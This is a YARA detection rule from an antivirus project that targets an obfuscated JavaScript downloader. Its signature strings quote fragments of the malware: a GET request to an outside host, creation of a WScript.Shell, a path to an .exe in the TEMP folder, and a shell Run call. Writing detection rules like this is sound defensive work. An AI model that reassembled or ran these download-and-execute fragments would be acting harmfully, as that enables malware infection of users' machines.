rule sig_20160330_8a06aad5e0af49a85f496dd0553e995a {
  meta:
    description = "datamaliciousorder - file 20160330_8a06aad5e0af49a85f496dd0553e995a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8102e17446f504a2a2e1dd1344dfee3ba3b59301d32c511edd2dc81baeda470a"

  strings:
    $s1  = "_KM[_F](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "function _D0(_X2, _C){_FZ = _FZ * 1; return _X2 - _C;};" fullword ascii
    $s3  = "var _KJ = function _LQ() {return WScript[_Q](\"WScript\"+\".Shell\");}(), _MQ = 11;" fullword ascii
    $s4  = "if (_KM[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _WX() {return _KJ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"UNI2iX8zM8rtpsz.ex\" + \"e\";};" fullword ascii
    $s6  = "function _VF(){return _MS + \"\";};" fullword ascii
    $s7  = "function _J() {return ((_HY == true) && (_HY == _K)) ? 1 : _FZ;};" fullword ascii
    $s8  = "function _X(_NX){_KJ[\"Run\"](_NX, _FZ, _FZ);};" fullword ascii
    $s9  = " while (_I){" fullword ascii
    $s10 = "function _D(){return _Q;};" fullword ascii
    $s11 = "var _X0 = new this[\"Date\"]();" fullword ascii
    $s12 = "function _FU(){return 22;};" fullword ascii
    $s13 = "return _D0(_X1, _ET);" fullword ascii
    $s14 = "function _NH()" fullword ascii
    $s15 = "function _J0(_O) {var _FO = (1, 2, 3, 4, 5, _O); return _FO;};" fullword ascii
    $s16 = "var _K = false;" fullword ascii
    $s17 = "_K = true; " fullword ascii
    $s18 = "_HY = true; " fullword ascii
    $s19 = "var _HY = false;" fullword ascii
    $s20 = "var _KB = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}